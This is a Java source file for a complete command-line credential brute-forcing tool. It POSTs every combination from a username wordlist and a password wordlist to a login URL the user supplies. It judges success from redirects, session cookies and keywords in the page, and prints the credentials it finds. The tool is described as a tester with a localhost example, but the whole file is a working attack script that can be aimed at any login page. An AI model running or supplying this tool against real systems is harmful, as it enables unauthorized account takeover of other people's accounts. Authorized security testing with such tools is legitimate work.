import java.io.*;
import java.net.*;
import java.util.*;

public class BruteForce {
    
    private static final String TEAL = "\u001B[36m";
    private static final String RED = "\u001B[31m";
    private static final String GREEN = "\u001B[32m";
    private static final String RESET = "\u001B[0m";
    
    private String targetUrl;
    private int requestDelay = 100; // milliseconds between requests
    
    public BruteForce(String targetUrl) {
        this.targetUrl = targetUrl;
    }
    
    public void setRequestDelay(int milliseconds) {
        this.requestDelay = milliseconds;
    }
    
    // Test authentication with a list of credentials
    public void testCredentials(List<String> usernames, List<String> passwords) {
        System.out.println(TEAL + "[*] Starting brute force test..." + RESET);
        System.out.println(TEAL + "[*] Target: " + targetUrl + RESET);
        System.out.println(TEAL + "[*] Testing " + usernames.size() + " usernames with " + 
                          passwords.size() + " passwords\n" + RESET);
        
        int attempts = 0;
        int successful = 0;
        
        for (String username : usernames) {
            for (String password : passwords) {
                attempts++;
                
                try {
                    Thread.sleep(requestDelay);
                    boolean success = attemptLogin(username, password);
                    
                    if (success) {
                        successful++;
                        System.out.println(GREEN + "[+] SUCCESS: " + username + ":" + password + RESET);
                    } else {
                        System.out.println(RED + "[-] Failed: " + username + ":" + password + RESET);
                    }
                    
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }
        
        System.out.println(TEAL + "\n[*] Test complete!" + RESET);
        System.out.println(TEAL + "[*] Total attempts: " + attempts + RESET);
        System.out.println(TEAL + "[*] Successful: " + successful + RESET);
    }
    
    // Attempt a single login
    private boolean attemptLogin(String username, String password) {
        try {
            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setInstanceFollowRedirects(false); // Don't auto-follow redirects
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            
            String postData = "username=" + URLEncoder.encode(username, "UTF-8") + 
                            "&password=" + URLEncoder.encode(password, "UTF-8");
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(postData.getBytes("UTF-8"));
            }
            
            int responseCode = conn.getResponseCode();
            
            // Standard web auth patterns:
            // Success: 200 OK, 302 redirect to dashboard/home, or Set-Cookie header
            // Failure: 401 Unauthorized, 403 Forbidden, or 200 with error message
            
            if (responseCode == 302 || responseCode == 301) {
                // Check redirect location
                String location = conn.getHeaderField("Location");
                return location != null && 
                       (location.contains("dashboard") || 
                        location.contains("home") || 
                        location.contains("success"));
            }
            
            if (responseCode == 401 || responseCode == 403) {
                return false; // Explicit auth failure
            }
            
            // Check for session cookie (common success indicator)
            String cookies = conn.getHeaderField("Set-Cookie");
            if (cookies != null && cookies.contains("session")) {
                return true;
            }
            
            // Read response body
            BufferedReader in = new BufferedReader(
                new InputStreamReader(
                    responseCode >= 400 ? conn.getErrorStream() : conn.getInputStream()
                ));
            String inputLine;
            StringBuilder response = new StringBuilder();
            
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            
            String responseBody = response.toString().toLowerCase();
            
            // Check for success indicators in response
            boolean hasSuccessIndicators = responseBody.contains("success") || 
                                           responseBody.contains("welcome") ||
                                           responseBody.contains("dashboard") ||
                                           responseBody.contains("logged in");
            
            // Check for failure indicators
            boolean hasFailureIndicators = responseBody.contains("invalid") ||
                                           responseBody.contains("incorrect") ||
                                           responseBody.contains("failed") ||
                                           responseBody.contains("error");
            
            return responseCode == 200 && hasSuccessIndicators && !hasFailureIndicators;
            
        } catch (IOException e) {
            System.err.println("[!] Connection error: " + e.getMessage());
            return false;
        }
    }
    
    // Load credentials from file
    public static List<String> loadFromFile(String filename) {
        List<String> items = new ArrayList<>();
        try (BufferedReader br = new BufferedReader(new FileReader(filename))) {
            String line;
            while ((line = br.readLine()) != null) {
                String trimmed = line.trim();
                if (!trimmed.isEmpty()) {
                    items.add(trimmed);
                }
            }
        } catch (IOException e) {
            System.err.println(RED + "[!] Error reading file: " + e.getMessage() + RESET);
        }
        return items;
    }
    
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        
        System.out.println(TEAL + "==================================" + RESET);
        System.out.println(TEAL + "   BRUTE FORCE TESTER" + RESET);
        System.out.println(TEAL + "==================================" + RESET);
        System.out.println();
        
        // Get target URL from user
        System.out.print(TEAL + "Enter target URL (e.g. http://localhost:8080/login): " + RESET);
        String targetUrl = scanner.nextLine();
        
        // Get username wordlist
        System.out.print(TEAL + "Enter path to username wordlist: " + RESET);
        String usernameFile = scanner.nextLine();
        List<String> usernames = loadFromFile(usernameFile);
        
        if (usernames.isEmpty()) {
            System.out.println(RED + "[!] No usernames loaded. Exiting." + RESET);
            scanner.close();
            return;
        }
        System.out.println(GREEN + "[+] Loaded " + usernames.size() + " usernames" + RESET);
        
        // Get password wordlist
        System.out.print(TEAL + "Enter path to password wordlist: " + RESET);
        String passwordFile = scanner.nextLine();
        List<String> passwords = loadFromFile(passwordFile);
        
        if (passwords.isEmpty()) {
            System.out.println(RED + "[!] No passwords loaded. Exiting." + RESET);
            scanner.close();
            return;
        }
        System.out.println(GREEN + "[+] Loaded " + passwords.size() + " passwords" + RESET);
        
        // Get delay setting
        System.out.print(TEAL + "Enter delay between requests in ms (default 500): " + RESET);
        String delayInput = scanner.nextLine();
        int delay = 500;
        if (!delayInput.isEmpty()) {
            try {
                delay = Integer.parseInt(delayInput);
            } catch (NumberFormatException e) {
                System.out.println(RED + "[!] Invalid delay, using default (500ms)" + RESET);
            }
        }
        
        System.out.println();
        
        // Create tester instance and run
        BruteForce tester = new BruteForce(targetUrl);
        tester.setRequestDelay(delay);
        tester.testCredentials(usernames, passwords);
        
        scanner.close();
    }
}